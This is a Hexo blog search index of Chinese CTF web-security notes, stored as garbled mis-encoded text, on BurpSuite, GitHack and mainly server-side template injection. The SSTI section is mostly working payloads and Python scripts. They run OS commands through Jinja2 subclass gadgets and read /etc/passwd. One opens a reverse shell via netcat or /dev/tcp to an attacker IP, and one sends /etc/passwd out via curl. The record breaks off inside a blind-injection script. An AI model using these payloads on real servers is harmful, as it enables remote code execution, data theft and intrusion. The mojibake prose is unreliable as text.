<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BurpSuite</title>
    <url>/2024/07/25/BurpSuite/</url>
    <content><![CDATA[<p>&emsp;&emsp;BurpSuiteåšwebæ‰‹è¦éå¸¸ç†Ÿç»ƒçš„ä¸€ä¸ªå·¥å…·,å®ç”¨æŒ‡æ•°:â­â­â­â­â­ã€‚å…³äºå·¥å…·|è„šæœ¬è¿™ä¸€æ¨¡å—æˆ‘è¿™é‡Œå°±ä¸è¯¦ç»†çš„è¯´æ˜ä½¿ç”¨æ–¹æ³•äº†ï¼Œé‡ç‚¹æ˜¯ä¸‹äº†è‡ªå·±å»è¯•ä¸€ä¸‹ï¼Œå¤šç»ƒï¼ˆç»å¯¹ä¸æ˜¯å› ä¸ºæˆ‘æ‡’(ã£â—â€¸â—Ÿc)ï¼‰</p>
<h3 id="BPçš„ä¸‹è½½"><a href="#BPçš„ä¸‹è½½" class="headerlink" title="BPçš„ä¸‹è½½"></a>BPçš„ä¸‹è½½</h3><p>&emsp;&emsp;ç›´æ¥ç»™é“¾æ¥äº†:<a href="https://blog.csdn.net/m0_63100066/article/details/128355365">BurpSuite</a></p>
<h3 id="BPçš„ä½¿ç”¨"><a href="#BPçš„ä½¿ç”¨" class="headerlink" title="BPçš„ä½¿ç”¨"></a>BPçš„ä½¿ç”¨</h3><p>&emsp;&emsp;è¿˜æ˜¯é‚£å¥è¯ï¼Œè‡ªå·±å»æ‰¾é¢˜ç›®æŠ“å‡ ä¸ªåŒ…è¯•ä¸€ä¸‹ï¼Œæ¨èblogï¼š<a href="https://blog.csdn.net/Javachichi/article/details/135837378">BPä½¿ç”¨</a>,å¯ä»¥è‡ªå·±å»ç½‘ä¸Šæ‰¾åˆé€‚çš„ï¼Œè¿™é‡Œç€é‡å¼ºè°ƒéœ€è¦æŒæ¡çš„æ–¹æ³•ï¼Œ<font color=red>æŠ“çš„åŒ…ä¼šæ”¾åœ¨ä»£ç†æ¨¡å—ä¸­(proxy)ï¼Œè¦è¿›è¡Œä¿®æ”¹æ•°æ®è¦<code>å³å‡»ç‚¹å‡»å‘é€åˆ°Repeater</code>ä¹Ÿå°±æ˜¯å“åº”æ¨¡å—ä¸­ï¼Œè¦è¿›è¡Œçˆ†ç ´éœ€è¦<code>å³å‡»ç‚¹å‡»å‘é€åˆ°Intruder</code>ä¹Ÿå°±æ˜¯é‡å¤æ¨¡å—ä¸­ï¼Œåœ¨ç„¶åå°±æ˜¯åœ¨å„ä¸ªæ¨¡å—ä¸­çš„ä¸€äº›åŸºæ“ï¼Œæ¯”å¦‚åœ¨Repeateræ¨¡å—ä¸­å˜æ›´è¯·æ±‚æ–¹æ³•ï¼Œåœ¨Intruderæ¨¡å—ä¸­è®¾ç½®è½½è·é€‰é¡¹ã€‚</font>æ¨èä¸æ˜¯ä¸­æ–‡çš„æ‰¾ä¸ªä¸­æ–‡ç‰ˆçš„ç”¨ç”¨ã€‚å…¶æ¬¡å‘¢<font color=blue>æ–‡ç« ä¸­æåˆ°äº†Proxy SwitchyOmegaæ‰©å±•è¦å®‰è£…å¥½ï¼Œæˆ‘å°±ä¸å•ç‹¬å‡ºä¸€ç¯‡äº†ï¼Œå®‰è£…æ–¹æ³•å’Œhackbarä¸€æ ·çš„å»æ‰©å±•æœä¸€ä¸‹å°±è¡Œï¼Œå› ä¸ºæ–¹ä¾¿åˆ‡æ¢ä»£ç†ï¼Œæ¯”å¦‚BPé»˜è®¤8080ï¼ŒçŒ«é»˜è®¤7890ï¼Œåç»­æœ‰äº†æ›´å¤šçš„ç«¯å£åï¼Œè¿™ä¸ªæ‰©å±•å°±æ˜¾å¾—å°¤å…¶æ–¹ä¾¿ã€‚</font><font color=pink>æœ€åè¦çŸ¥é“HTTPçš„å„ç±»çŠ¶æ€ç ï¼Œåœ¨é¢å¯¹Intruderæ¨¡å—ä¸­èƒ½æ›´å¿«æ‰¾åˆ°è¯·æ±‚æˆåŠŸçš„é¡µé¢ã€‚</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">1xxï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºæ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç†ã€‚</span><br><span class="line">2xxï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯•ã€‚</span><br><span class="line">3xxï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ï¼šéœ€è¦åç»­æ“ä½œæ‰èƒ½å®Œæˆè¿™ä¸€è¯·æ±‚ã€‚</span><br><span class="line">4xxï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šè¡¨ç¤ºè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆã€‚</span><br><span class="line">5xxï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ï¼šæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ã€‚</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHack</title>
    <url>/2024/08/03/GitHack/</url>
    <content><![CDATA[<p>&emsp;&emsp;GitHacké’ˆå¯¹äºgitæ³„éœ²é¢˜ç›®ï¼Œé€šå¸¸å…ˆç”¨dirsearchæ‰«æå‡ºå¤§é‡gitæ¨å‡ºä¸ºgitæ³„éœ²ï¼Œå°±å¯ä»¥ç”¨æ­¤è„šæœ¬è¿›è¡Œæºç è·å–ï¼Œå®ç”¨æŒ‡æ•°:â­â­â­,å®‰è£…æ–¹å¼æŒºç®€å•ï¼Œkali:</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ä½¿ç”¨æ–¹æ³•:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://example.com:8088/.git</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ç„¶åä¼šåœ¨distç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€è®¿é—®å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTIæ³¨å…¥</title>
    <url>/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>&emsp;&emsp;SSTIæ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå®ƒå‡ºç°åœ¨ä½¿ç”¨æ¨¡æ¿å¼•æ“çš„webåº”ç”¨ç¨‹åºä¸­ã€‚æ¨¡å—å¼•æ“æ˜¯ä¸€ç§å°†åŠ¨æ€æ•°æ®ä¸é™æ€æ¨¡æ¿ç»“åˆç”Ÿæˆæœ€ç»ˆè¾“å‡ºçš„å·¥å…·ã€‚ç„¶è€Œï¼Œå¦‚æœåœ¨æ„å»ºæ¨¡æ¿æ—¶æœªæ­£ç¡®å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå°±å¯èƒ½å¯¼è‡´SSTIæ¼æ´çš„äº§ç”Ÿã€‚</p>
<h3 id="å¼•æ“è¯†åˆ«"><a href="#å¼•æ“è¯†åˆ«" class="headerlink" title="å¼•æ“è¯†åˆ«"></a>å¼•æ“è¯†åˆ«</h3><p>&emsp;&emsp;åšé¢˜çš„æ—¶å€™ï¼Œå¯¹ç…§è¿™ä¸ªå›¾ç‰‡å°±å¯ä»¥åˆ¤æ–­æ˜¯å“ªç§å¼•æ“äº†ã€‚<br><img data-src="/images/SSTI.png" alt="SSTI"></p>
<h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><p>&emsp;&emsp;æˆ‘ä»¬å…ˆäº†è§£ä¸€äº›åŸºç¡€çš„æ–¹æ³•ï¼Œç„¶åå°±æ‡‚å¾—payloadæ˜¯æ€æ ·çš„äº†ã€‚</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">__class__   # æŸ¥æ‰¾å½“å‰ç±»å‹çš„æ‰€å±å¯¹è±¡</span><br><span class="line">__base__    # æ²¿ç€çˆ¶å­ç±»çš„å…³ç³»å¾€ä¸Šèµ°ä¸€ä¸ª</span><br><span class="line">__mro__     # æŸ¥æ‰¾å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»</span><br><span class="line">__subclasses__() #æŸ¥æ‰¾çˆ¶ç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæ‹¬å·ä¸èƒ½å°‘</span><br><span class="line">__init__    # æŸ¥çœ‹ç±»æ˜¯å¦é‡è½½,å¦‚æœå‡ºç°<span class="keyword">wrapper</span>å­—çœ¼ï¼Œè¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå°±ä¸èƒ½åˆ©ç”¨</span><br><span class="line">__globals__ # å‡½æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰å¯¹è±¡çš„å…¨éƒ¨å…¨å±€å˜é‡</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;é‚£ä¹ˆå¤§è‡´çš„åšé¢˜æ€è·¯å°±æ˜¯ï¼Œå…ˆåˆ¤æ–­å¼•æ“ï¼Œåœ¨å¥—ç”¨æ–¹æ³•ã€‚</p>
<h3 id="æŸ¥è¯¢æ³¨å…¥æ¨¡å—"><a href="#æŸ¥è¯¢æ³¨å…¥æ¨¡å—" class="headerlink" title="æŸ¥è¯¢æ³¨å…¥æ¨¡å—"></a>æŸ¥è¯¢æ³¨å…¥æ¨¡å—</h3><p>&emsp;&emsp;æœ‰å›æ˜¾æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ä¸‰æ­¥ï¼Œå°†æ¨¡å—åˆ—ä¸¾å‡ºæ¥ï¼Œæ²¡æœ‰ä¹Ÿå¯ä»¥ç”¨è„šæœ¬è·‘å‡ºæ¥ï¼Œç„¶åé€‰æ‹©åˆé€‚çš„æ³¨å…¥æ¨¡å—åˆ©ç”¨(ç”¨æ•°åˆ—è¡¨ç¤º)å³å¯ã€‚</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;config.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;[].<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥URLè¿æ¥ï¼š&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;postå‚æ•°&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib_external.FileLoaderï¼ˆæ³¨å…¥æ¨¡å—ï¼‰&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)  <span class="comment">#è¾“å‡ºæ‰€åœ¨è¡Œæ•°</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨æ³¨å…¥æ¨¡å—"><a href="#åˆ©ç”¨æ³¨å…¥æ¨¡å—" class="headerlink" title="åˆ©ç”¨æ³¨å…¥æ¨¡å—"></a>åˆ©ç”¨æ³¨å…¥æ¨¡å—</h3><p>&emsp;&emsp;çŸ¥é“æ¨¡å—æ‰€åœ¨è¡Œæ•°(<strong>subclasses</strong>()[æ¨¡å—æ‰€åœ¨è¡Œæ•°])åï¼Œå°±å¯ä»¥æ„é€ payloadæ‰§è¡Œå‘½ä»¤äº†,ä¾‹å¦‚ï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;.<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">137</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="symbol">&#x27;eval&#x27;</span>](&#x27;<span class="strong">__import__</span>(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™é‡Œç”¨çš„æ³¨å…¥æ¨¡å—(å­ç±»)ä¸º<code>_wrap_close</code>,<font color=red>æ³¨ï¼šæ–¹æ³•ä¸ºä¸¤æ¡ä¸‹åˆ’çº¿ï¼Œç±»ï¼ˆæ³¨å…¥æ¨¡å—ï¼‰åªæœ‰ä¸€æ¡ä¸”æ³¨å…¥æ¨¡å—çš„ä½ç½®ä¸å›ºå®šï¼Œä¹Ÿå°±æ˜¯[]é‡Œé¢çš„æ•°å­—æ˜¯å‘ç”Ÿå˜åŒ–çš„ã€‚</font></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">__builtins__    <span class="meta"># æä¾›å¯¹pythonçš„æ‰€æœ‰<span class="string">&quot;å†…ç½®&quot;</span>æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®</span></span><br><span class="line"><span class="built_in">eval</span>()          <span class="meta"># è®¡ç®—å­—ç¬¦ä¸²è¡¨è¾¾å¼çš„å€¼</span></span><br><span class="line">popen()         <span class="meta"># æ‰§è¡Œä¸€ä¸ªshellä»¥è¿è¡Œå‘½ä»¤æ¥å¼€å¯ä¸€ä¸ªè¿›ç¨‹</span></span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨æ³¨å…¥æ¨¡å—"><a href="#å¸¸ç”¨æ³¨å…¥æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ³¨å…¥æ¨¡å—"></a>å¸¸ç”¨æ³¨å…¥æ¨¡å—</h3><p>&emsp;&emsp;çŸ¥é“ä¸Šé¢è¿™äº›æ–¹æ³•æ€ä¹ˆç”¨ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ³¨å…¥æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯é‡Œé¢å­˜åœ¨çš„å­ç±»å»è°ƒç”¨å®ƒä»¬æ‰§è¡Œå‘½ä»¤(æ²¡æœ‰æ ‡è®°ä¿®æ”¹çš„è¯´æ˜dataéƒ¨åˆ†ä¸éœ€è¦ä¿®æ”¹)ã€‚å¸¸ç”¨çš„æœ‰</p>
<h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢æ³¨å…¥æ¨¡å—  _frozen_importlib_external<span class="selector-class">.FileLoader</span></span><br><span class="line">payload: &#123;&#123;&quot;<span class="selector-class">.__class__</span><span class="selector-class">.__mro__</span><span class="selector-attr">[1]</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[79]</span><span class="selector-attr">[<span class="string">&quot;get_data&quot;</span>]</span>(<span class="number">0</span>,&quot;/etc/passwd&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤"><a href="#å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤" class="headerlink" title="å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤"></a>å†…å»ºå‡½æ•°evalæ‰§è¡Œå‘½ä»¤</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢æ³¨å…¥æ¨¡å— <span class="variable">_wrap_close</span>æˆ–è€…eval</span><br><span class="line">(ç”¨æŸ¥è¯¢è„šæœ¬çš„ä¿®æ”¹éƒ¨åˆ†)</span><br><span class="line">data=&#123;<span class="string">&quot;postå‚æ•°&quot;</span> = â€œ&#123;&#123;<span class="string">&quot;.__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;â€&#125;</span></span><br><span class="line"><span class="string">if &#x27;eval&#x27; in response.text:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload: &#123;&#123;&quot;</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>()[<span class="number">137</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="osæ¨¡å—æ‰§è¡Œå‘½ä»¤"><a href="#osæ¨¡å—æ‰§è¡Œå‘½ä»¤" class="headerlink" title="osæ¨¡å—æ‰§è¡Œå‘½ä»¤"></a>osæ¨¡å—æ‰§è¡Œå‘½ä»¤</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">é€šè¿‡config,è°ƒç”¨os</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">é€šè¿‡url_for,è°ƒç”¨os</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__.os.popen</span>(<span class="name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">æŸ¥è¯¢æ³¨å…¥æ¨¡å— _wrap_closeæˆ–è€…os</span></span><br><span class="line"><span class="language-xml">(ç”¨æŸ¥è¯¢è„šæœ¬çš„ä¿®æ”¹éƒ¨åˆ†)</span></span><br><span class="line"><span class="language-xml">data=&#123;&quot;postå‚æ•°&quot;:&quot;</span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[&quot;+str(i)+&quot;].__init__.globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span></span><br><span class="line"><span class="language-xml">if &#x27;os.py&#x27; in response.text:</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&quot;</span>ls /<span class="string">&quot;).read()&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="importlibç±»æ‰§è¡Œå‘½ä»¤"><a href="#importlibç±»æ‰§è¡Œå‘½ä»¤" class="headerlink" title="importlibç±»æ‰§è¡Œå‘½ä»¤"></a>importlibç±»æ‰§è¡Œå‘½ä»¤</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">æŸ¥è¯¢æ³¨å…¥æ¨¡å— _frozen_importlib.Builtinlmporter</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="name">&quot;cat flag&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤"><a href="#linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤" class="headerlink" title="linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤"></a>linecacheå‡½æ•°æ‰§è¡Œå‘½ä»¤</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">æŸ¥è¯¢æ³¨å…¥æ¨¡å— linecache</span></span><br><span class="line"><span class="language-xml">(ç”¨æŸ¥è¯¢è„šæœ¬çš„ä¿®æ”¹éƒ¨åˆ†)</span></span><br><span class="line"><span class="language-xml">data=&#123;&quot;postå‚æ•°&quot;:&quot;</span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__bases__</span>[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span></span><br><span class="line"><span class="language-xml">if &#x27;linecache&#x27; in response.text:</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[191].__init__.__globals__.linecache.os.popen(<span class="name">&quot;ls -l /&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="subprocess-Popenç±»æ‰§è¡Œå‘½ä»¤"><a href="#subprocess-Popenç±»æ‰§è¡Œå‘½ä»¤" class="headerlink" title="subprocess.Popenç±»æ‰§è¡Œå‘½ä»¤"></a>subprocess.Popenç±»æ‰§è¡Œå‘½ä»¤</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">æŸ¥è¯¢æ³¨å…¥æ¨¡å— subprocess.Popen</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[200](<span class="name">&quot;tac flag&quot;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ— å›æ˜¾SSTI"><a href="#æ— å›æ˜¾SSTI" class="headerlink" title="æ— å›æ˜¾SSTI"></a>æ— å›æ˜¾SSTI</h3><p>&emsp;&emsp;é‚£æœ‰äººå°±è¦é—®äº†ï¼Œå“å‘€ï¼Œé¢˜ç›®æ²¡æœ‰å›æ˜¾æ€ä¹ˆåŠå•Šï¼Œç®€å•~(ç”¨è„šæœ¬æ— è„‘éƒ½å¯ä»¥)</p>
<h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1&quot;</span> <span class="comment">#URL</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;postå‚æ•°&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.5.51(kaliIP) 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#æˆ–è€…&quot;bash -i &gt;&amp; /dev/tcp/XXXX(æœåŠ¡å™¨/è·³æ¿)/XXXXï¼ˆç«¯å£å·ï¼‰ 0&gt;&amp;1&quot;</span></span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åŒæ—¶kaliç›‘å¬(nc -lnvp 7777)å³å¯ã€‚</p>
<h4 id="å¸¦å¤–æ³¨å…¥"><a href="#å¸¦å¤–æ³¨å…¥" class="headerlink" title="å¸¦å¤–æ³¨å…¥"></a>å¸¦å¤–æ³¨å…¥</h4><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">url = &quot;http://127.0.0.1:&quot; #URL</span></span><br><span class="line"><span class="language-xml">for i in range(300):</span></span><br><span class="line"><span class="language-xml">    try:</span></span><br><span class="line"><span class="language-xml">        data=&#123;&quot;postå‚æ•°&quot;:&#x27;</span><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](<span class="name">&quot;curl http://192.168.5.51(kaliIP)/`cat /etc/passwd`&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;&#125;</span></span><br><span class="line"><span class="language-xml">        response = requests.post(url,data=data)</span></span><br><span class="line"><span class="language-xml">    except:</span></span><br><span class="line"><span class="language-xml">        pass</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åŒæ—¶kaliå¼€å¯ä¸€ä¸ªpython httpç›‘å¬(python3 -m http.server 80)</p>
<h4 id="çº¯ç›²æ³¨"><a href="#çº¯ç›²æ³¨" class="headerlink" title="çº¯ç›²æ³¨"></a>çº¯ç›²æ³¨</h4><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">import requests</span></span><br><span class="line"><span class="language-xml">import time</span></span><br><span class="line"><span class="language-xml">url = input(&quot;è¯·è¾“å…¥ URLï¼š&quot;)</span></span><br><span class="line"><span class="language-xml">request_parameter = input(&quot;è¯·è¾“å…¥ POST è¯·æ±‚å‚æ•°ï¼š&quot;)</span></span><br><span class="line"><span class="language-xml">cs = &quot; !\&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="language-xml">flag = &quot;&quot;</span></span><br><span class="line"><span class="language-xml"># range() å‚æ•°ä¸º è„šæœ¬2 å¾—åˆ°çš„ flag é•¿åº¦</span></span><br><span class="line"><span class="language-xml">for i in range(25):</span></span><br><span class="line"><span class="language-xml">    low = 0</span></span><br><span class="line"><span class="language-xml">    high = len(cs)</span></span><br><span class="line"><span class="language-xml">    while low<span class="tag">&lt;<span class="name">high:</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">index</span> = <span class="string">low</span> + (<span class="attr">high</span> <span class="attr">-</span> <span class="attr">low</span>) // <span class="attr">2</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">start_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">request_parameter</span> <span class="attr">ä¸º</span> <span class="attr">post</span> <span class="attr">ä¼ å…¥æ•°æ®çš„å‚æ•°å</span>ï¼Œ<span class="attr">æ ¹æ®å®é™…æƒ…å†µè¾“å…¥</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">data</span> = <span class="string">&#123;</span> <span class="attr">request_parameter:</span>&quot;</span></span><span class="template-tag">&#123;%</span><span class="name">set</span> flag=().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat flag\&quot;).read()&#x27;</span>)<span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span><span class="name">if</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]==<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(2)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">elif</span> flag[<span class="string">&quot;+str(i)+&quot;</span>]&gt;<span class="string">&#x27;&quot;+cs[index]+&quot;&#x27;</span><span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[<span 